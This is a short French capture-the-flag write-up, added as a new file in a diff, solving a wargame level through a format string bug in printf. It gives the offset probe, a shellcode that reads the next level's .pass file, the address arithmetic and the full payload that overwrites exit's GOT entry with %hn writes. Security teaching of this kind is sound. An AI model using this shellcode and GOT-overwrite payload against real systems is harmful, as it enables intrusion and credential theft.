@@ -1,0 +1,23 @@
+Nous voyons que dans le printf, nous utilisons str (variable qu'on rempli avec fgets), c'est donc un format string attack.
+Nous trouvons l'offset
+
+python -c 'print "AAAA " + "%x " * 10'
+
+Puis nous avons plusieurs choix, utiliser un shellcode basique ou utiliser un shellcode comme dans l'exercice precedent. Prenons  la seconde solution.
+
+export SHELLCODE=`python -c 'print "\x90" * 250 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"'`
+
+puis nous le localisons a l'adresse 0xffffd818
+
+Nous décomposons l'adresse
+
+0xd818 = 55320 - 8 = 55312
+0xffff = 65535 - 55320 = 10215
+
+Puis nous localisons l'adresse de exit avec un objdump -R level05: 0x080497e0
+
+et nous lancons l'attaque
+
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55312x%10$hn" + "%10215x%11$hn"' > /tmp/jackpot
+cat /tmp/jackpot | ./level05
+
